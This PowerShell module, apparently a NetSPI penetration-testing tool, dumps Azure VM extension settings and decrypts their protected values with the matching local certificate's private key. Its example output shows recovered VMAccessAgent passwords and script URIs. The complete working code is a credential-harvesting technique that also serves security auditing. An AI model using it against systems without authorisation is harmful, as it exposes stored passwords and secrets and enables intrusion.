<#
	File: Get-AzureVMExtensionSettings.psm1
	Author: Jake Karnes, NetSPI - 2020
	Description: PowerShell function for dumping information from Azure VM Extension Settings
#>

Function Get-AzureVMExtensionSettings
{
<#
	.SYNOPSIS
		PowerShell function for dumping information from Azure VM Extension Settings
	.DESCRIPTION
		The function will read all available extension settings, decrypt protected values (if the required certificate can be found) and return all the settings.		
	.EXAMPLE
		PS C:\> Get-AzureVMExtensionSettings

		FileName                        : C:\Packages\Plugins\Microsoft.Azure.Security.IaaSAntimalware\1.5.5.9\RuntimeSettings\0.settings
		ExtensionName                   : Microsoft.Azure.Security.IaaSAntimalware
		ProtectedSettingsCertThumbprint : 
		ProtectedSettings               : 
		ProtectedSettingsDecrypted      : 
		PublicSettings                  : {"AntimalwareEnabled":true,"RealtimeProtectionEnabled":"false","ScheduledScanSettings":{...},"Exclusions":{...}}

		FileName                        : C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\1.10.5\RuntimeSettings\0.settings
		ExtensionName                   : Microsoft.Compute.CustomScriptExtension
		ProtectedSettingsCertThumbprint : 23B8893CD7...
		ProtectedSettings               : MIIB8AYJKoZIhvcNAQc...UNMih8=
		ProtectedSettingsDecrypted      : {"fileUris":["http://.../netspi/launcher.ps1"]}
		PublicSettings                  : {"commandToExecute":"powershell -ExecutionPolicy Unrestricted -file launcher.ps1 "}

		FileName                        : C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.3\RuntimeSettings\1.settings
		ExtensionName                   : Microsoft.CPlat.Core.RunCommandWindows
		ProtectedSettingsCertThumbprint : C85DD4C5E9...
		ProtectedSettings               : MIIBsAYJKoZI...B+E0ZomM6gAghguFCQ28f2w==
		ProtectedSettingsDecrypted      : 
		PublicSettings                  : {"script":["whoami"]}
		
		FileName                        : C:\WindowsAzure\CollectGuestLogsTemp\5e3cfc7e-c8b2-4fce-96f0-6c1b2c2bc87d.zip\Config\WireServerRoleExtensionsConfig_f26eeb35-229d-4f5e-9877-f8666a1680e9._MGITest.xml
		ExtensionName                   : Microsoft.Compute.VMAccessAgent
		ProtectedSettingsCertThumbprint : 20304BDF13...
		ProtectedSettings               : MIIB0AYJKoZI...GkBIzEtqohr/WJd5KSCK
		ProtectedSettingsDecrypted      : {"Password":"[REDACTED]"}
		PublicSettings                  : {"UserName":"[REDACTED]"}
#>

	#Load dependency
	[System.Reflection.Assembly]::LoadWithPartialName("System.Security") | Out-Null

	#Get all runtime settings files
	$settingsFiles = Get-ChildItem -Path C:\Packages\Plugins\*\*\RuntimeSettings -Include *.settings -Recurse
	foreach($settingsFile in $settingsFiles){
		#Convert file contents to JSON
		$settingsJson = Get-Content $settingsFile | Out-String | ConvertFrom-Json
		JsonParser $settingsFile.FullName ($settingsFile.FullName | Split-Path -Parent | Split-Path -Parent | Split-Path -Parent | Split-Path -Leaf) $settingsJson
		
	}

	#Use settings in a ZIP file saved under C:\WindowsAzure\CollectGuestLogsTemp if available
	if(Test-Path C:\WindowsAzure\CollectGuestLogsTemp\*.zip){
	    
        #The GUID may change, but an example path is: C:\WindowsAzure\CollectGuestLogsTemp\*.zip\Config\WireServerRoleExtensionsConfig_*.xml
        
        #Open the target file within the ZIP
        Add-Type -assembly "system.io.compression.filesystem"
        $psZipFile = Get-Item -Path C:\WindowsAzure\CollectGuestLogsTemp\*.zip
        $zip = [io.compression.zipfile]::OpenRead($psZipFile.FullName)
        $file = $zip.Entries | where-object { $_.Name -Like "WireServerRoleExtensionsConfig*.xml"}
        $stream = $file.Open()

        #Read the contents of the file into a string
        $reader = New-Object IO.StreamReader($stream)
        $text = $reader.ReadToEnd()

        #Close our streams
        $reader.Close()
        $stream.Close()
        $zip.Dispose()

        #Convert to an XML object
		[xml]$extensionsConfig = $text

		#For each stored extension configuration
		foreach($extension in $extensionsConfig.Extensions.PluginSettings.Plugin){
			#Grab the json out and parse it
			JsonParser ($psZipFile.FullName+'\'+$file.FullName.Replace("/","\")) $extension.name ($extension.RuntimeSettings.'#text' | ConvertFrom-Json)
		}

    }

}

#A helper function to parse the runTimeSettings JSON into a nicer PowerShell object
function JsonParser($fileName,$extensionName, $json)
{
    #For each runTimeSetting (there should only be one, but it is an array)
	foreach($setting in $json.runtimeSettings){
	
		#Build a container object which we'll output later
		$outputObj = "" | Select-Object -Property FileName,ExtensionName,ProtectedSettingsCertThumbprint,ProtectedSettings,ProtectedSettingsDecrypted,PublicSettings
		$outputObj.FileName = $fileName
        $outputObj.ExtensionName = $extensionName
		$outputObj.ProtectedSettingsCertThumbprint = $setting.handlerSettings.protectedSettingsCertThumbprint
		$outputObj.ProtectedSettings = $setting.handlerSettings.protectedSettings
		$outputObj.PublicSettings = $setting.handlerSettings.publicSettings | ConvertTo-Json -Compress 

		#Extract the thumbprint
		$thumbprint = $setting.handlerSettings.protectedSettingsCertThumbprint

		#Only continue if a thumbprint is specified. Not all settings files have protected properties
		if($thumbprint){
			#Search all certificates, keeping the one with the corresponding thumbprint
			$cert = Get-ChildItem -Path 'Cert:\' -Recurse | where {$_.Thumbprint -eq $thumbprint}

			#Check if we found a cert, we might not find a corresponding cert if running as a lower privileged user
			if($cert){
				#Check that the cert has a private key we can access. We can't decrypt without the private key
				if($cert.HasPrivateKey){

					#Decode the protected settings into a byte array
					$bytes =  [System.Convert]::FromBase64String($outputObj.ProtectedSettings)

					#Decrypt the bytes using the cert's private key
					$envelope = New-Object Security.Cryptography.Pkcs.EnvelopedCms
					$envelope.Decode($bytes)
					$col = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2Collection $cert
					$envelope.Decrypt($col)
					$decryptedContent = [text.encoding]::UTF8.getstring($envelope.ContentInfo.Content)

					#Add the decrypted settings to our container. The JSON conversion ensures that whitespace is minimized
					$outputObj.ProtectedSettingsDecrypted = $decryptedContent | ConvertFrom-Json| ConvertTo-Json -Compress 
				}
			}
		}

		#Output our gathered setting info
		Write-Output $outputObj
	}
}